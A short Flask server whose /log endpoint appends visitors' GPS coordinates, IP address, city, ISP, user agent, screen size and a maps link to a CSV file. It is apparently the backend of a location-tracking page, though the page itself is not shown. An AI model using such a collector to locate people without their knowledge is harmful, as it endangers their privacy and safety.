from flask import Flask, render_template, request
import csv

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    with open("results.csv", "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            data.get("latitude"),
            data.get("longitude"),
            data.get("accuracy"),
            data.get("ip"),
            data.get("city"),
            data.get("region"),
            data.get("country"),
            data.get("isp"),
            data.get("userAgent"),
            data.get("screen"),
            data.get("mapsUrl")
        ])
    return "Logged", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
